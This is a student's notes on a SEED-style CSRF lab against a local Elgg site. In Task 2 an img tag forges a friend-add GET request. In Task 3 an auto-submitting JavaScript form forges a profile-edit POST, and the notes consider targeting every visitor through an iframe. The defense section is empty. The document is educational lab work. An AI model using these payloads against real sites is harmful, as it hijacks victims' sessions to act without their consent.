# Cross-Site Request Forgery (CSRF) Attack Lab
- a CSRF attack involves a victim user, a trusted site, and a malicious site, the victim user holds an active session with a trusted site while visiting a malicious site. The malicious site injects an HTTP request for the trusted site into the victim user session, causing damages
- web application used: `Elgg`
- topics
    - CSRF attack
    - CSRF countermeasures: Secret token and Same-site cookie
    - JavaScript and Ajax

## Lab Setup
- the Elgg container (`10.9.0.5 www.seed-server.com`)
- the attacker container (`10.9.0.105 www.attacker32.com`)
- DNS configuration
    ```
    10.9.0.5 www.seed-server.com
    10.9.0.5 www.example32.com
    10.9.0.105 www.attacker32.com
    ```

## Task 1: Observing HTTP Request
- use HTTP Header Live on Firefox

## Task 2: CSRF Attack using GET Request
- use Alice's and Samy's account, use CSRF to make Alice add Samy to her Elgg friend list
- login as Samy, add Charlie as friend, use HTTP Header Live to see the request
    - URL (duplicated parameters are removed) `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707056081&__elgg_token=-RraUFTlunG52v081kwsbw`
- requirement: not use JS code, the attack should succeed as soon as Alice visits the page
- `__elgg_ts` and `__elgg_token` are actually used to defeat CSRF, in this lab, they are disabled
- so, the link to add Samy to friend list is `http://www.seed-server.com/action/friends/add?friend=59`, `59` is the id of Samy, we can figure this out by use another account to add Samy and inspect the request URL
- when Alice clicks a link from Samy, she visits `www.attacker32.com`, to trigger a GET request to Elgg, use an image tag `<img>` in `www.attacker32.com`, add the following content to `Labsetup/attacker/addfriend.html`
    - `<img src="http://www.seed-server.com/action/friends/add?friend=59" />`
- when Alice logged into Elgg, and visits `www.attacker32.com/addfriend.html`, it triggers a GET request to Elgg, and add Samy to Alice's friend list

## Task 3: CSRF Attack using POST Request
- use CSRF to edit Alice's profile to `Samy is my Hero`
- inspect the HTTP request when clicking save on the profile edit page, it is a POST request, the data in request body is `name=Samy$description=<p>123456</p>&guid=59` (I removed some parameters that is not used), the URL is `http://seed-server.com/samy/edit`
- by adding Alice to friend list, we can get Alice's guid from the request URL, its 56, so we need to construct a POST request with data `name=Alice$description=<p>Samy is my Hero</p>&guid=56`, and the URL should be `http://seed-server.com/action/profile/edit`
- we can set these values in the given `editprofile.html`, in this file it modifies `Brief description`, instead of `About Me`
    ```
    <script type="text/javascript">
    function forge_post() {
        var fields;

        fields += "<input type='hidden' name='name' value='Alice'>";
        fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
        fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
        fields += "<input type='hidden' name='guid' value='56'>";

        var p = document.createElement("form");
        p.action = "http://www.seed-server.com/action/profile/edit";
        p.innerHTML = fields;
        p.method = "post";

        document.body.appendChild(p);
        p.submit();
    }
    window.onload = function() { forge_post();}
    </script>
    ```

- Question: what if we want to modify the profile of all users who visits the malicious site
    - we need to dynamically get the name and guid of the victims
    - use `<iframe src="http://www.seed-server.com">` to load Elgg inside the attacker's site, if we success, we can put the script inside the iframe, and use `elgg.session.user.name` and `elgg.session.user.guid` to get user name and guid
    - however, the Elgg website cannot be loaded in the iframe, the error information is `"To protect your security, www.seed-server.com will not allow Firefox to display the page if another site has embedded it. To see this page, you need to open it in a new window"`, there might be a countermeasure implemented in the Elgg application

## Task: Defense
